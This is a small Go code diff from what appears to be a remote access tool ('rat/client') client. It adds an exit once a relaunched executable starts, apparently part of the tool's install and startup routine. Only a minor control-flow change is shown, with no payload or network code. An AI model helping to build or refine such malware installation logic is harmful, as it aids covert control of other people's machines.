@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"os"
 	"os/exec"
 	"rat/client/install"
 	"rat/client/startup"
@@ -26,6 +27,8 @@ func main() {
 			err = exec.Command(file).Start()
 			if err != nil {
 				fmt.Println(err.Error())
+			} else {
+				os.Exit(0)
 			}
 		}
 	}
